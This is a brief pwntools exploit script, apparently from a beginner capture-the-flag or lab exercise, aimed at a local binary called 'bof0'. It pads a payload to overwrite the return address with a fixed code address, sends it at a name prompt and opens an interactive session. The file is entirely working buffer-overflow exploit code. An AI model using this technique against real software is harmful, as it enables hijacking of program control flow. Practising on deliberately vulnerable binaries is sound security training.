#!/usr/bin/python3

from pwn import *

exe = ELF('./bof0')
p = process([exe.path])
# p = gdb.debug([exe.path],'''
#               b* 0x401323
#               b* main+0xb1
#               c
#               ''')

sigsegv_offset = 0x00000000004012c0


payload = b'%c'
payload = payload.ljust(23,b'A')
payload += p64(sigsegv_offset)

p.sendlineafter("What is your name?", payload)
p.interactive()
